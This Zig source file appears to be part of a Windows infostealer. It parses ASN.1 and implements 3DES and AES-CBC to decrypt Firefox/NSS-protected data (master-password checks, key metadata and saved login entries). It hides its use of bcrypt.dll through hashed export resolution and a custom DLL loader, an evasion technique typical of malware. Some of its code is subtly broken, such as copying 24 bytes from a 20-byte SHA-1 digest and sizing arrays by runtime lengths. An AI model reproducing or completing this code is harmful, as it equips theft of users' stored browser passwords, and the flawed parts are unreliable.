const std = @import("std");
const crypto = std.crypto;
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const dll_loader = @import("../crypto/dll_loader.zig");

// ── ASN1 DER Parser ──

pub const ASN1_TAG_SEQUENCE: u8 = 0x30;
pub const ASN1_TAG_OID: u8 = 0x06;
pub const ASN1_TAG_OCTET_STRING: u8 = 0x04;
pub const ASN1_TAG_INTEGER: u8 = 0x02;
pub const ASN1_TAG_NULL: u8 = 0x05;
pub const ASN1_TAG_CONTEXT_0: u8 = 0xA0;
pub const ASN1_TAG_CONTEXT_1: u8 = 0xA1;

pub const Asn1Error = error{
    Truncated,
    InvalidTag,
    InvalidLength,
    UnsupportedTag,
};

pub fn readTag(data: []const u8, pos: *usize) !u8 {
    if (pos.* >= data.len) return Asn1Error.Truncated;
    const tag = data[pos.*];
    pos.* += 1;
    return tag;
}

pub fn readLength(data: []const u8, pos: *usize) !usize {
    if (pos.* >= data.len) return Asn1Error.Truncated;
    const first = data[pos.*];
    pos.* += 1;
    if ((first & 0x80) == 0) return first;
    const num_bytes = first & 0x7F;
    if (num_bytes == 0) return Asn1Error.InvalidLength;
    if (num_bytes > 4) return Asn1Error.UnsupportedTag;
    var len: usize = 0;
    var i: usize = 0;
    while (i < num_bytes) : (i += 1) {
        if (pos.* >= data.len) return Asn1Error.Truncated;
        len = (len << 8) | data[pos.*];
        pos.* += 1;
    }
    return len;
}

pub fn readSequence(data: []const u8, pos: *usize) ![]const u8 {
    const tag = try readTag(data, pos);
    if (tag != ASN1_TAG_SEQUENCE) return Asn1Error.InvalidTag;
    const len = try readLength(data, pos);
    const start = pos.*;
    pos.* += len;
    if (pos.* > data.len) return Asn1Error.Truncated;
    return data[start..][0..len];
}

pub fn readOctetString(data: []const u8, pos: *usize) ![]const u8 {
    const tag = try readTag(data, pos);
    if (tag != ASN1_TAG_OCTET_STRING) return Asn1Error.InvalidTag;
    const len = try readLength(data, pos);
    const start = pos.*;
    pos.* += len;
    if (pos.* > data.len) return Asn1Error.Truncated;
    return data[start..][0..len];
}

pub fn readInteger(data: []const u8, pos: *usize) !u64 {
    const tag = try readTag(data, pos);
    if (tag != ASN1_TAG_INTEGER) return Asn1Error.InvalidTag;
    const len = try readLength(data, pos);
    if (pos.* + len > data.len) return Asn1Error.Truncated;
    var val: u64 = 0;
    for (0..len) |i| {
        val = (val << 8) | data[pos.* + i];
    }
    pos.* += len;
    return val;
}

pub fn readOid(data: []const u8, pos: *usize) ![]const u8 {
    const tag = try readTag(data, pos);
    if (tag != ASN1_TAG_OID) return Asn1Error.InvalidTag;
    const len = try readLength(data, pos);
    const start = pos.*;
    pos.* += len;
    if (pos.* > data.len) return Asn1Error.Truncated;
    return data[start..][0..len];
}

pub fn skipTag(data: []const u8, pos: *usize) !void {
    const tag = try readTag(data, pos);
    _ = tag;
    const len = try readLength(data, pos);
    pos.* += len;
    if (pos.* > data.len) return Asn1Error.Truncated;
}

pub fn peekTag(data: []const u8, pos: usize) ?u8 {
    if (pos >= data.len) return null;
    return data[pos];
}

// ── 3DES-CBC via BCrypt ──

const NTSTATUS = i32;

const BCryptOpenAlgorithmProvider = *const fn (
    phAlgorithm: *types.PVOID,
    pszAlgId: *const u16,
    pszImplementation: *const u16,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptCloseAlgorithmProvider = *const fn (
    hAlgorithm: types.PVOID,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptSetProperty = *const fn (
    hObject: types.PVOID,
    pszProperty: *const u16,
    pbInput: *const u8,
    cbInput: u32,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptGenerateSymmetricKey = *const fn (
    phKey: *types.PVOID,
    hAlgorithm: types.PVOID,
    pbKeyObject: ?*u8,
    cbKeyObject: u32,
    pbSecret: *const u8,
    cbSecret: u32,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptDestroyKey = *const fn (
    hKey: types.PVOID,
) callconv(.c) NTSTATUS;

const BCryptDecrypt = *const fn (
    hKey: types.PVOID,
    pbInput: *const u8,
    cbInput: u32,
    pPaddingInfo: ?*const anyopaque,
    pbIV: ?*u8,
    cbIV: u32,
    pbOutput: ?*u8,
    cbOutput: u32,
    pcbResult: *u32,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

fn toWide(comptime s: []const u8) [s.len:0]u16 {
    comptime {
        var buf: [s.len:0]u16 = undefined;
        for (s, 0..) |c, i| {
            buf[i] = c;
        }
        buf[s.len] = 0;
        return buf;
    }
}

const BCRYPT_3DES_ALGORITHM = toWide("3DES");
const BCRYPT_CHAINING_MODE_CBC = toWide("ChainingModeCBC");
const BCRYPT_CHAINING_MODE = toWide("ChainingMode");

var g_bcrypt_base: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_bcrypt_open: ?BCryptOpenAlgorithmProvider = null;
var g_bcrypt_close: ?BCryptCloseAlgorithmProvider = null;
var g_bcrypt_set_prop: ?BCryptSetProperty = null;
var g_bcrypt_gen_key: ?BCryptGenerateSymmetricKey = null;
var g_bcrypt_destroy_key: ?BCryptDestroyKey = null;
var g_bcrypt_decrypt: ?BCryptDecrypt = null;

fn ensure3DesInit() bool {
    if (@intFromPtr(g_bcrypt_base) != 1) return true;
    g_bcrypt_base = dll_loader.getOrLoadDll("bcrypt.dll") orelse return false;
    const R = export_resolve.getFunctionByHash;
    const B = g_bcrypt_base;
    g_bcrypt_open = @ptrCast(@alignCast(R(B, hash.encryptedHashFunc("BCryptOpenAlgorithmProvider")) orelse return false));
    g_bcrypt_close = @ptrCast(@alignCast(R(B, hash.encryptedHashFunc("BCryptCloseAlgorithmProvider")) orelse return false));
    g_bcrypt_set_prop = @ptrCast(@alignCast(R(B, hash.encryptedHashFunc("BCryptSetProperty")) orelse return false));
    g_bcrypt_gen_key = @ptrCast(@alignCast(R(B, hash.encryptedHashFunc("BCryptGenerateSymmetricKey")) orelse return false));
    g_bcrypt_destroy_key = @ptrCast(@alignCast(R(B, hash.encryptedHashFunc("BCryptDestroyKey")) orelse return false));
    g_bcrypt_decrypt = @ptrCast(@alignCast(R(B, hash.encryptedHashFunc("BCryptDecrypt")) orelse return false));
    return true;
}

pub fn des3DecryptCbc(key: [24]u8, iv: [8]u8, data: []const u8, out: []u8) ![]u8 {
    if (!ensure3DesInit()) return error.BCryptNotAvailable;
    if (data.len % 8 != 0 or data.len == 0) return error.InvalidDataLength;
    if (out.len < data.len) return error.OutputTooSmall;

    var hAlgo: types.PVOID = undefined;
    var status = g_bcrypt_open.?( &hAlgo, &BCRYPT_3DES_ALGORITHM, &@as(*const u16, @ptrFromInt(0)).*, 0);
    if (status < 0) return error.BCryptOpenFailed;
    errdefer _ = g_bcrypt_close.?(hAlgo, 0);

    status = g_bcrypt_set_prop.?(hAlgo, &BCRYPT_CHAINING_MODE, &@as(*const u8, @ptrCast(&BCRYPT_CHAINING_MODE_CBC)).*, @sizeOf(@TypeOf(BCRYPT_CHAINING_MODE_CBC)), 0);
    if (status < 0) return error.BCryptSetChainingFailed;

    var hKey: types.PVOID = undefined;
    status = g_bcrypt_gen_key.?( &hKey, hAlgo, null, 0, @as(*const u8, @ptrCast(&key)), 24, 0);
    if (status < 0) return error.BCryptKeyImportFailed;
    errdefer _ = g_bcrypt_destroy_key.?(hKey);

    var iv_buf = iv;
    var result_len: u32 = 0;
    status = g_bcrypt_decrypt.?(
        hKey,
        @as(*const u8, @ptrCast(data.ptr)),
        @as(u32, @intCast(data.len)),
        null,
        @as(?*u8, @ptrCast(&iv_buf)),
        8,
        @as(?*u8, @ptrCast(out.ptr)),
        @as(u32, @intCast(@as(u32, @intCast(out.len)))),
        &result_len,
        0,
    );
    if (status < 0) return error.BCryptDecryptFailed;
    return out[0..result_len];
}

// ── AES-128-CBC ──

pub fn aes128DecryptCbc(key: [16]u8, iv: [16]u8, data: []const u8, out: []u8) ![]u8 {
    if (data.len % 16 != 0 or data.len == 0) return error.InvalidDataLength;
    if (out.len < data.len) return error.OutputTooSmall;

    const aes = crypto.core.aes.Aes128.initDecrypt(&key);
    var prev = iv;
    for (0..data.len / 16) |i| {
        var block: [16]u8 = undefined;
        aes.decrypt(&block, data[i * 16 ..][0..16].*);
        for (0..16) |j| {
            out[i * 16 + j] = block[j] ^ prev[j];
        }
        @memcpy(&prev, data[i * 16 ..][0..16]);
    }
    return out[0..data.len];
}

// ── Key Derivation Helpers ──

fn sha1(data: []const u8) [20]u8 {
    var result: [20]u8 = undefined;
    crypto.hash.Sha1.hash(data, &result, .{});
    return result;
}

fn hmacSha1(key: []const u8, data: []const u8) [20]u8 {
    var result: [20]u8 = undefined;
    crypto.auth.hmac.HmacSha1.create(&result, data, key);
    return result;
}

// ── PBE Decoders ──

pub fn decryptNssPbe(global_salt: []const u8, master_pwd: []const u8, enc_data: []const u8, out: []u8) ?[]u8 {
    if (enc_data.len < 10) return null;

    var pos: usize = 0;
    const outer_seq = readSequence(enc_data, &pos) catch return null;
    var inner_pos: usize = 0;
    const algo_seq = readSequence(outer_seq, &inner_pos) catch return null;
    var algo_pos: usize = 0;
    readOid(algo_seq, &algo_pos) catch return null;
    const salt_seq = readSequence(algo_seq, &algo_pos) catch return null;
    var salt_pos: usize = 0;
    const entry_salt = readOctetString(salt_seq, &salt_pos) catch return null;
    if (entry_salt.len < 16) return null;
    const actual_salt = entry_salt[0..16];
    const len_val = readInteger(salt_seq, &salt_pos) catch return null;
    _ = len_val;

    var enc_pos = pos;
    const encrypted = readOctetString(enc_data, &enc_pos) catch return null;
    if (encrypted.len % 8 != 0) return null;
    if (encrypted.len < 8) return null;

    // Key derivation: SHA1 → HMAC-SHA1 key stretching
    var hp_input: [global_salt.len + master_pwd.len]u8 = undefined;
    @memcpy(hp_input[0..global_salt.len], global_salt);
    @memcpy(hp_input[global_salt.len..], master_pwd);
    const hp = sha1(&hp_input);

    var chp_input: [global_salt.len + 20]u8 = undefined;
    @memcpy(chp_input[0..global_salt.len], global_salt);
    @memcpy(chp_input[global_salt.len..], &hp);
    const chp = sha1(&chp_input);

    // Derive 3DES key (24 bytes) using HMAC-SHA1
    var des_key: [24]u8 = undefined;
    var k1_salt: [actual_salt.len + 1]u8 = undefined;
    @memcpy(k1_salt[0..actual_salt.len], actual_salt);
    k1_salt[actual_salt.len] = 0x00;
    var k1 = hmacSha1(&chp, &k1_salt);

    var k2_salt: [k1.len + actual_salt.len + 1]u8 = undefined;
    @memcpy(k2_salt[0..k1.len], k1[0..]);
    @memcpy(k2_salt[k1.len..][0..actual_salt.len], actual_salt);
    k2_salt[k1.len + actual_salt.len] = 0x00;
    var k2 = hmacSha1(&chp, &k2_salt);

    var k3_salt: [k2.len + actual_salt.len + 1]u8 = undefined;
    @memcpy(k3_salt[0..k2.len], k2[0..]);
    @memcpy(k3_salt[k2.len..][0..actual_salt.len], actual_salt);
    k3_salt[k2.len + actual_salt.len] = 0x00;
    var k3 = hmacSha1(&chp, &k3_salt);

    @memcpy(des_key[0..8], k1[0..8]);
    @memcpy(des_key[8..16], k2[0..8]);
    @memcpy(des_key[16..24], k3[0..8]);

    // Derive IV (8 bytes)
    var iv_salt: [actual_salt.len + 1]u8 = undefined;
    @memcpy(iv_salt[0..actual_salt.len], actual_salt);
    iv_salt[actual_salt.len] = 0x01;
    const iv1 = hmacSha1(&chp, &iv_salt);
    var iv: [8]u8 = undefined;
    @memcpy(&iv, iv1[0..8]);

    des3DecryptCbc(des_key, iv, encrypted, out) catch return null;
    const pad_byte = out[encrypted.len - 1];
    const pad_len = @as(usize, @intCast(pad_byte));
    if (pad_len > 0 and pad_len <= 8) {
        return out[0 .. encrypted.len - pad_len];
    }
    return out[0..encrypted.len];
}

pub fn decryptMetaPbe(global_salt: []const u8, enc_data: []const u8, out: []u8) ?[]u8 {
    if (enc_data.len < 20) return null;

    var pos: usize = 0;
    const outer_seq = readSequence(enc_data, &pos) catch return null;
    var inner_pos: usize = 0;
    const algo_seq = readSequence(outer_seq, &inner_pos) catch return null;
    var algo_pos: usize = 0;
    readOid(algo_seq, &algo_pos) catch return null;
    const pbkdf2_wrapper = readSequence(algo_seq, &algo_pos) catch return null;
    var pbkdf2_pos: usize = 0;
    readOid(pbkdf2_wrapper, &pbkdf2_pos) catch return null;
    const pbkdf2_params = readSequence(pbkdf2_wrapper, &pbkdf2_pos) catch return null;
    var param_pos: usize = 0;
    const entry_salt = readOctetString(pbkdf2_params, &param_pos) catch return null;
    const iteration_count = readInteger(pbkdf2_params, &param_pos) catch return null;
    var key_size: usize = 16;
    if (peekTag(pbkdf2_params, param_pos)) |tag| {
        if (tag == ASN1_TAG_INTEGER) {
            key_size = @as(usize, @intCast(readInteger(pbkdf2_params, &param_pos) catch 16));
        }
    }
    var iv: [16]u8 = undefined;
    const enc_algo_wrapper = readSequence(pbkdf2_wrapper, &pbkdf2_pos) catch return null;
    var enc_algo_pos: usize = 0;
    readOid(enc_algo_wrapper, &enc_algo_pos) catch return null;
    const iv_bytes = readOctetString(enc_algo_wrapper, &enc_algo_pos) catch return null;
    if (iv_bytes.len < 16) return null;
    @memcpy(&iv, iv_bytes[0..16]);

    var enc_pos = pos;
    const encrypted = readOctetString(enc_data, &enc_pos) catch return null;
    if (encrypted.len % 16 != 0) return null;

    // Key: SHA1(globalSalt) → PBKDF2-SHA256
    const key_material = sha1(global_salt);
    var aes_key: [16]u8 = undefined;
    crypto.pwhash.pbkdf2(&aes_key, &key_material, entry_salt, @as(u32, @intCast(iteration_count)), crypto.auth.hmac.HmacSha256) catch return null;

    aes128DecryptCbc(aes_key, iv, encrypted, out) catch return null;
    const pad_byte = out[encrypted.len - 1];
    const pad_len = @as(usize, @intCast(pad_byte));
    if (pad_len > 0 and pad_len <= 16) {
        return out[0 .. encrypted.len - pad_len];
    }
    return out[0..encrypted.len];
}

pub fn decryptLoginPbe(key: []const u8, iv_and_data: []const u8, out: []u8) ?[]u8 {
    if (iv_and_data.len < 8 + 8) return null;
    if (out.len < iv_and_data.len - 8) return null;

    var des_key: [24]u8 = undefined;
    const key_hash = sha1(key);
    @memcpy(des_key[0..24], key_hash[0..24]);

    var iv: [8]u8 = undefined;
    @memcpy(&iv, iv_and_data[0..8]);
    const encrypted = iv_and_data[8..];

    des3DecryptCbc(des_key, iv, encrypted, out) catch return null;
    const pad_byte = out[encrypted.len - 1];
    const pad_len = @as(usize, @intCast(pad_byte));
    if (pad_len > 0 and pad_len <= 8) {
        return out[0 .. encrypted.len - pad_len];
    }
    return out[0..encrypted.len];
}

test "ASN1 readTag" {
    var pos: usize = 0;
    const data = [_]u8{0x30, 0x02, 0x04, 0x00};
    const tag = try readTag(&data, &pos);
    try std.testing.expectEqual(@as(u8, 0x30), tag);
    try std.testing.expectEqual(@as(usize, 1), pos);
}

test "ASN1 readLength short" {
    var pos: usize = 0;
    const data = [_]u8{0x10};
    const len = try readLength(&data, &pos);
    try std.testing.expectEqual(@as(usize, 16), len);
    try std.testing.expectEqual(@as(usize, 1), pos);
}

test "ASN1 readLength long" {
    var pos: usize = 0;
    const data = [_]u8{0x81, 0x80};
    const len = try readLength(&data, &pos);
    try std.testing.expectEqual(@as(usize, 128), len);
    try std.testing.expectEqual(@as(usize, 2), pos);
}

test "ASN1 readOctetString" {
    var pos: usize = 0;
    const data = [_]u8{0x04, 0x04, 0x01, 0x02, 0x03, 0x04};
    const result = try readOctetString(&data, &pos);
    try std.testing.expectEqual(@as(usize, 4), result.len);
    try std.testing.expectEqual(@as(u8, 0x01), result[0]);
}

test "ASN1 readInteger" {
    var pos: usize = 0;
    const data = [_]u8{0x02, 0x02, 0x03, 0xE8};
    const val = try readInteger(&data, &pos);
    try std.testing.expectEqual(@as(u64, 1000), val);
}

test "AES-128-CBC roundtrip" {
    var key: [16]u8 = undefined;
    @memset(&key, 0x2A);
    var iv: [16]u8 = undefined;
    @memset(&iv, 0x1B);
    var plain = [_]u8{0x00} ** 32;
    @memset(&plain, 0x42);

    const aes_enc = crypto.core.aes.Aes128.initEncrypt(&key);
    var ct_buf: [32]u8 = undefined;
    var prev = iv;
    for (0..2) |i| {
        var xored: [16]u8 = undefined;
        for (0..16) |j| { xored[j] = plain[i * 16 + j] ^ prev[j]; }
        aes_enc.encrypt(ct_buf[i * 16 ..][0..16], xored);
        @memcpy(&prev, ct_buf[i * 16 ..][0..16]);
    }

    var dec_buf: [32]u8 = undefined;
    const dec = try aes128DecryptCbc(key, iv, &ct_buf, &dec_buf);
    try std.testing.expectEqualSlices(u8, &plain, dec);
}

test "SHA1 basic" {
    const result = sha1("abc");
    const expected = [_]u8{ 0xA9, 0x99, 0x3E, 0x36, 0x47, 0x06, 0x81, 0x6A, 0xBA, 0x3E, 0x25, 0x71, 0x78, 0x50, 0xC2, 0x6C, 0x9C, 0xD0, 0xD8, 0x9D };
    try std.testing.expectEqualSlices(u8, &expected, &result);
}
